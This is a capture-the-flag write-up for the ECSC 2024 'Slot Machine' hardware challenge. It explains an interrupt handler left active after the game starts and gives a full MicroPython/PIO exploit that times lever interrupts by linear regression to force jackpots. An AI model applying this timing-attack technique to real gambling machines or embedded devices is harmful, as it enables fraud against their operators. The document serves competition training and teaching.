# ECSC 2024 - Jeopardy

## [hardware] Slot Machine (2 solves)

A casino hired you to find out why some players win the slot machine all the time. You're given the source code of the slot machine.

`HAL_GPIO_EXTI_Callback` is the challback of an interrupt on the pin: `SLOT_MACHINE_LEVER`

Note: the documentation is in the `UART to I2C` challenge

Authors: Giovanni Minotti <@Giotino>, Andrea Angelo Raineri <@Rising>

## Overview

The challenge emulates a slot machine with three cylinders and the main goal is to make the cylinders stop all at the same number.
The first cylinder can be stopped by triggering an interrupt over pin `SLOT_MACHINE_LEVER` (or it is stopped by a timer interrupt if the user is not triggering the start of the game).
The second and third cylinders stop after a number of rotations equal to the number selected in the previous cylinder.
Only at most 128 number out of 384 total are suitable for a possible win, but random shuffles applied to cylinders make the challenge impossible to be solved just by luck.

## Solution

The interrupt handler is not deactivated after the start of the game, allowing the user to trigger it again with precise timing to stop all cylinders at the same number.
In order to compute the correct timings, the output of the rounds can be used to evaluate linear functions mapping the delay before the interrupt and the number outcome via linear regression (`compute_coefficients()`).
After that, a target number can be selected and use the linear functions to compute the delay needed to stop each cylinder at the target number.

NOTE: In order to be able to have a fine-grained control of the timing of interrupt signals and higher clock speeds the player has to leverage the PIO feature of the RP2040 microcontroller of the Pizza Slice.

## Exploit

```python
from machine import Pin, UART
import rp2
import time

BASE = 50
INCREMENT = 50


@rp2.asm_pio(set_init=rp2.PIO.OUT_LOW, out_shiftdir=rp2.PIO.SHIFT_RIGHT)
def programmable_cylinder():
    set(y, 3)
    set(pins, 1)[1]
    set(pins, 0)

    label("loop")

    pull()
    mov(x, osr)
    label("delay")
    jmp(x_dec, "delay")

    set(pins, 1)[1]
    set(pins, 0)

    jmp(y_dec, "loop")

    label("end")
    nop()
    jmp("end")


rst = Pin(1, Pin.OUT, value=1)
uart = UART(1, baudrate=115200, tx=Pin(8), rx=Pin(9), timeout=1000, rxbuf=4096)


def reset():
    rst.value(0)
    rst.value(1)
    while True:
        l = uart.readline()
        if l is not None:
            l = l.strip()
            if ">" in l:
                uart.write("3\r\n")
                uart.readline() # Read the feedback
                break


def run(a, b, c):
    time.sleep(1)
    sm = rp2.StateMachine(0, programmable_cylinder, freq=120000, set_base=Pin(0))
    sm.put(a)
    sm.put(b)
    sm.put(c)
    sm.active(1)
    time.sleep(0.1)
    sm.active(0)


def find_index(cylinder, value):
    for i, v in enumerate(cylinder):
        if v == value:
            return i
    return -1


def read_cylinders():
    i = -1
    j = 0
    cylinders = [[], [], []]
    while True:
        l = uart.readline()
        if l is not None:
            l = l.strip()
            if "ROULETTE" in l:
                i = 0
                continue
            if i >= 0:
                cylinders[i].append(int(l))
                j += 1
                if j == 256:
                    i += 1
                    j = 0
                    if i == 3:
                        break
    return cylinders


def read_results(cylinders):
    uart.readline()
    r1 = uart.readline().strip()
    pos1 = find_index(cylinders[0], int(r1))
    r2 = uart.readline().strip()
    pos2 = find_index(cylinders[1], int(r2))
    r3 = uart.readline().strip()
    pos3 = find_index(cylinders[2], int(r3))
    print("Read cylinders", r1, "->", pos1, "|", r2, "->", pos2, "|", r3, "->", pos3)
    print(uart.readline())
    return (pos1, pos2, pos3)


def find_greatest_common_indexes(cylinders):
    common_numbers = set(cylinders[0])
    for sublist in cylinders[1:]:
        common_numbers.intersection_update(sublist)
    if not common_numbers:
        return None, []
    greatest_common_number = max(common_numbers)
    indexes = []
    for sublist in cylinders:
        if greatest_common_number in sublist:
            indexes.append(sublist.index(greatest_common_number))
        else:
            indexes.append(None)
    return greatest_common_number, indexes


def find_linear_coefficients(x1, f_x1, x2, f_x2):
    a = (f_x2 - f_x1) / (x2 - x1)
    b = f_x1 - a * x1
    return a, b


def linear_regression(points):
    n = len(points)
    sum_x = sum([p[0] for p in points])
    sum_y = sum([p[1] for p in points])
    sum_x_squared = sum([p[0] ** 2 for p in points])
    sum_xy = sum([p[0] * p[1] for p in points])

    a = (n * sum_xy - sum_x * sum_y) / (n * sum_x_squared - sum_x**2)
    b = (sum_y - a * sum_x) / n

    return a, b


def apply_linear_coefficients(a, b, x):
    t = round(a * x + b)
    if t < 0:
        return 0
    return t


adj = [0, 0, 0]


def adjust(expectation, reality, limit=3):
    for i in range(limit):
        if reality[i] > expectation[i]:
            adj[i] -= 5
            return False
        elif reality[i] < expectation[i]:
            adj[i] += 5
            return False
    return True


def compute_coefficients():
    # coeffs = [(26.08904, -22.02013), (26.14699, -16.19466), (26.31579, -26.31582)] # 1000
    coeffs = [(2.717184, -6.578125), (2.740916, -6.74076), (2.74837, -6.86531)] # 100
    # coeffs = []
    for c in range(len(coeffs), 3):
        samples = []
        t = BASE
        prev = 0
        while True:
            reset()
            cylinders = read_cylinders()
            n, idxs = find_greatest_common_indexes(cylinders)

            # The firsts position are really hard to achieve
            if 0 in idxs or 1 in idxs:
                continue

            print("Found number", n, "with indices", idxs)
            timings = [0, 0, 0]
            for i in range(3):
                if idxs[i] is not None and len(coeffs) > i:
                    timings[i] = apply_linear_coefficients(
                        coeffs[i][0], coeffs[i][1], idxs[i]
                    )
                else:
                    timings[i] = t
            print("Timings", timings)
            run(timings[0], timings[1], timings[2])
            g = read_results(cylinders)

            # Remove invalid values
            if g[c] == 254 or (g[c] != 0 and g[c] < prev) or (g[c] == 0 and prev == 0):
                break
            prev = g[c]
            if g[c] == 0:
                t += t // 100
                continue

            eq = adjust(idxs, g, c)
            # If we missed a previous number we can't be sure of the result of the current number
            if not eq:
                continue

            samples.append((g[c], t))
            t += INCREMENT

        print("Samples", samples)
        print("Cylinder", c)
        coeff = linear_regression(samples)
        print("(a, b) = ", coeff)
        coeffs.append(coeff)
    return coeffs


coeffs = compute_coefficients()
print("Coefficients", coeffs)

# Loop and auto-adjust
i = 0
reset()
while True:
    cylinders = read_cylinders()
    n, idxs = find_greatest_common_indexes(cylinders)

    t1 = apply_linear_coefficients(coeffs[0][0], coeffs[0][1], idxs[0]) + adj[0]
    t2 = apply_linear_coefficients(coeffs[1][0], coeffs[1][1], idxs[1]) + adj[1]
    t3 = apply_linear_coefficients(coeffs[2][0], coeffs[2][1], idxs[2]) + adj[2]
    print("Greatest number", n, "with indices", idxs, "and timings", [t1, t2, t3])
    run(t1, t2, t3)
    r = read_results(cylinders)
    eq = adjust(idxs, r)
    if eq:
        i += 1
        print("Jackpot N", i)
        if i == 3:
            break
    else:
        i = 0
        print("Adjustments", adj)
        print(uart.readline())
        reset()

print(uart.readline())
```
